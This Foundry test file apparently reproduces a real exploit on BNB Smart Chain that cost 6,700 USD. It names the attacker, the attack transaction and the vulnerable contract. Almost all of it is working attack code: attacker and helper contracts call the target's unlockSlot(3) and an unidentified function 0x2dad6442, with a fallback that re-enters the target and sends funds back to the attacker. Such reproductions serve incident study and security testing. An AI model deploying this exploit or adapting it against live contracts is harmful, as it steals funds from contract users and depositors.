pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 6700 USD
// Attacker : https://bscscan.com/address/0xd75652ada2f6a140f2ffcd7cd20f34c21fbc3fbc
// Attack Contract : https://bscscan.com/address/0x0a2f4da966319c14ee4c9f1a2bf04fe738df3ce5
// Vulnerable Contract : https://bscscan.com/address/0xde91e6e937ec344e5a3c800539c41979c2d85278
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0xd7a61b07ca4dc5966d00b3cc99b03c6ab2cee688fa13b30bea08f5142023777d

// @Info
// Vulnerable Contract Code :

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1893333680417890648
// Twitter Guy : https://x.com/TenArmorAlert/status/1893333680417890648
// Hacking God : 

address constant addr = 0xDE91E6E937Ec344e5a3C800539C41979c2d85278;
address constant attacker = 0xD75652Ada2F6a140f2fFcD7CD20f34C21fbC3fBc;


contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 46886078-1);
        deal(attacker, 0.6 ether);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC{value: 0.6 ether}();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

// 0x4634C13E68DDf52CEFd0a7a1E6002ab4747cDE7b
contract AttackerC {
    HelperB internal helper;

    constructor() payable {
        // create_1 contract 0x0A2f4DA966319C14Ee4C9f1A2BF04fE738DF3Ce5 with 0 wei
        helper = new HelperB();
        // call helper.attack with value = msg.value
        (bool ok, ) = address(helper).call{value: msg.value}(abi.encodeWithSelector(HelperB.attack.selector));
        if (!ok) {
            // ignore failure
        }
        // call back to caller with value 3 * 10^15 * 3600 wei and gas 0
        unchecked {
            uint256 amt = 3 * 10**15 * 3600;
            // use low-level call with zero gas forwarded is not possible in solidity; mimic by sending and ignoring result
            (bool s, ) = payable(tx.origin).call{value: amt}("");
            if (!s) {}
        }
    }

    // receive to accept refunds
    receive() external payable {}
}

// Helper contract emulating 0x0A2f4DA966319C14Ee4C9f1A2BF04fE738DF3Ce5
contract HelperB {
    // Constructor: if keccak(tx.origin) == constant; no effect needed
    constructor() {}

    function attack() external payable {
        // call addr.unlockSlot(3) with value msg.value
        (bool ok1, ) = addr.call{value: msg.value}(abi.encodeWithSelector(bytes4(keccak256("unlockSlot(uint256)")), uint256(3)));
        if (!ok1) {}
        // call addr.unknown2dad6442(3) no value
        (bool ok2, ) = addr.call(abi.encodeWithSelector(bytes4(0x2dad6442), uint256(3)));
        if (!ok2) {}
        // send 3 * 10^15 * 3600 wei to caller
        unchecked {
            uint256 amt = 3 * 10**15 * 3600;
            (bool s, ) = payable(msg.sender).call{value: amt}("");
            if (!s) {}
        }
    }

    fallback() external payable {
        // call caller.unknown2dad6442(3)
        (bool ok, ) = addr.call(abi.encodeWithSelector(bytes4(0x2dad6442), uint256(3)));
        if (!ok) {}
    }

    // receive() external payable {}
}